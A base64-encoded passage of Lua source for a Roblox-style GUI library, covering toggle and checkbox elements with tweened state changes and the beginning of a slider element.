ICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDUsIDAsIDE3KTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTEwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwogICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxBbGlnbm1lbnQgPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuUmlnaHQ7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgOSk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBUb2dnbGUKICAgICAgICAgICAgICAgICAgICBpZiBjZmcudHlwZSA9PSAiY2hlY2tib3giIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExheW91dE9yZGVyID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAxNiwgMCwgMTYpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDY3LCA2NywgNjgpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAib3V0bGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIsIDEsIC0yKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyTW9kZSA9IEVudW0uQm9yZGVyTW9kZS5JbnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAib3V0bGluZSIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInRpY2siIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkltYWdlTGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2VUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzExMTg2MjY5ODQ2NzU3NSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAtMSwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAyLCAxLCAyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDIxMSwgMjExLCAyMTEpKSwgcmdia2V5KDEsIHJnYigyMTEsIDIxMSwgMjExKSl9CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyAgCiAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMYXlvdXRPcmRlciA9IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMC41KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIC05LCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMzYsIDAsIDE4KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbmxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlck1vZGUgPSBFbnVtLkJvcmRlck1vZGUuSW5zZXQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAiaW5saW5lIiBdLCAiYWNjZW50IiwgIkJhY2tncm91bmRDb2xvcjMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDIxMSwgMjExLCAyMTEpKSwgcmdia2V5KDEsIHJnYigyMTEsIDIxMSwgMjExKSl9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImNpcmNsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtMTQsIDAsIDIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTIsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNpcmNsZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgIC0tICAgICAgICAgICAgICAgIAogICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KGJvb2wpCiAgICAgICAgICAgICAgICBpZiBjZmcudHlwZSA9PSAiY2hlY2tib3giIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRpY2siIF0sIHtSb3RhdGlvbiA9IGJvb2wgYW5kIDAgb3IgNDUsIEltYWdlVHJhbnNwYXJlbmN5ID0gYm9vbCBhbmQgMCBvciAxfSkKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCB0aGVtZXMucHJlc2V0LmFjY2VudCBvciByZ2IoNjcsIDY3LCA2OCl9KQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJvdXRsaW5lIiBdLCB7QmFja2dyb3VuZENvbG9yMyA9IGJvb2wgYW5kIHRoZW1lcy5wcmVzZXQuYWNjZW50IG9yIHJnYigyMiwgMjIsIDI0KX0pCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZV9idXR0b24iIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgdGhlbWVzLnByZXNldC5hY2NlbnQgb3IgcmdiKDU4LCA1OCwgNjIpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJpbmxpbmUiIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgdGhlbWVzLnByZXNldC5hY2NlbnQgb3IgcmdiKDUwLCA1MCwgNTApfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJjaXJjbGUiIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgcmdiKDI1NSwgMjU1LCAyNTUpIG9yIHJnYig4NiwgODYsIDg4KSwgUG9zaXRpb24gPSBib29sIGFuZCBkaW0yKDEsIC0xNCwgMCwgMikgb3IgZGltMigwLCAyLCAwLCAyKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGNmZy5lbmFibGVkID0gYm9vbAogICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKGJvb2wpCgogICAgICAgICAgICAgICAgaWYgY2ZnLmZvbGRpbmcgdGhlbiAKICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5WaXNpYmxlID0gYm9vbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gYm9vbAogICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIAogICAgICAgICAgICBpdGVtc1sgInRvZ2dsZSIgXS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oSW5wdXQpCiAgICAgICAgICAgICAgICBpZiBJbnB1dC5Vc2VySW5wdXRUeXBlIH49IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGNmZy5lbmFibGVkID0gbm90IGNmZy5lbmFibGVkIAogICAgICAgICAgICAgICAgY2ZnLnNldChjZmcuZW5hYmxlZCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihJbnB1dCkKICAgICAgICAgICAgICAgIGlmIElucHV0LlVzZXJJbnB1dFR5cGUgfj0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgY2ZnLmVuYWJsZWQgPSBub3QgY2ZnLmVuYWJsZWQgCiAgICAgICAgICAgICAgICBjZmcuc2V0KGNmZy5lbmFibGVkKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBjZmcuc2VwZXJhdG9yIHRoZW4gLS0gb2sgYnJvIG15IGx1YSBlaXRoZXIgc3Vja3Mgb3IgdGhpcyB3YXMgYSBwYWluIGluIHRoZSBhc3MgdG8gbWFrZSAoc2ltcGxlIGlmIHN0YXRlbWVudCBhc3dlbGwg8J+SlCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGNmZy5zZXQoY2ZnLmRlZmF1bHQpCgogICAgICAgICAgICBjb25maWdfZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnNldAoKICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgZW5kIAogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6c2xpZGVyKG9wdGlvbnMpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBuYW1lID0gb3B0aW9ucy5uYW1lIG9yIG5pbCwKICAgICAgICAgICAgICAgIHN1ZmZpeCA9IG9wdGlvbnMuc3VmZml4IG9yICIiLAogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLCAKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsOyAKCiAgICAgICAgICAgICAgICAtLSB2YWx1ZSBzZXR0aW5ncwogICAgICAgICAgICAgICAgbWluID0gb3B0aW9ucy5taW4gb3Igb3B0aW9ucy5taW5pbXVtIG9yIDAsCiAgICAgICAgICAgICAgICBtYXggPSBvcHRpb25zLm1heCBvciBvcHRpb25zLm1heGltdW0gb3IgMTAwLAogICAgICAgICAgICAgICAgaW50ZXJ2YWxzID0gb3B0aW9ucy5pbnRlcnZhbCBvciBvcHRpb25zLmRlY2ltYWwgb3IgMSwKICAgICAgICAgICAgICAgIGRlZmF1bHQgPSBvcHRpb25zLmRlZmF1bHQgb3IgMTAsCiAgICAgICAgICAgICAgICB2YWx1ZSA9IG9wdGlvbnMuZGVmYXVsdCBvciAxMCwgCiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKCiAgICAgICAgICAgICAgICBkcmFnZ2luZyA9IGZhbHNlLAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fQogICAgICAgICAgICB9IAoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJzbGlkZXJfb2JqZWN0IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyX29iamVjdCIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyX29iamVjdCIgXTsKICAgI